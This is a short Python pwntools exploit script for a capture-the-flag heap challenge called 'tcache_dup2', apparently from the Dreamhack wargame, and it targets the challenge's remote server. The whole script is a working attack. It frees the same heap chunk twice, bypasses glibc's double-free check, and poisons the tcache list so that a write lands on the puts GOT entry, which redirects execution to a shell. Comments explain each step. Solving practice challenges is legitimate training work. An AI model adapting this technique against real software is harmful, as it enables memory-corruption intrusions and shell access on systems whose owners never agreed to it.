# Name: tcache_dup2.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 12397

p = remote(HOST,PORT) # remote
# p = process('./tcache_dup2', env={'LD_PRELOAD':'./libc-2.30.so'}) # local
e = ELF('./tcache_dup2')

# context.log_level = 'debug'

#ifndef __Custom_Functions_For_Convenience_
#define __Custom_Functions_For_Convenience_
def create_heap(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def modify_heap(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete_heap(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
#endif /* __Custom_Functions_For_Convenience_ */

#ifndef __Custom_Global_Variables_For_Convenience_
#define __Custom_Global_Variables_For_Convenience_
dummy = b'A'
puts_got = e.got['puts']
get_shell = e.symbols['get_shell']
#endif /* __Custom_Global_Variables_For_Convenience_ */

# Initial tcache is empty
# tcache[0x20]: empty

# tcache[0x20]: Chunk A -> Chunk A
create_heap(0x10, dummy)
delete_heap(0) # tcache[0x20].append(Chunk A)
modify_heap(0, 0x10, dummy * 9) # Bypassing the DFB mitigation
delete_heap(0) # tcache[0x20].append(Chunk A)

# tcache[0x20]: puts@got -> ...
modify_heap(0, 0x10, p64(puts_got) + b'\x00') # tcache[0x20].first().set_fd(puts_got) & Bypassing the DFB mitigation
create_heap(0x10, dummy) # tcache[0x20].pop()

# Overwrite puts@got
create_heap(0x10, p64(get_shell))

p.interactive()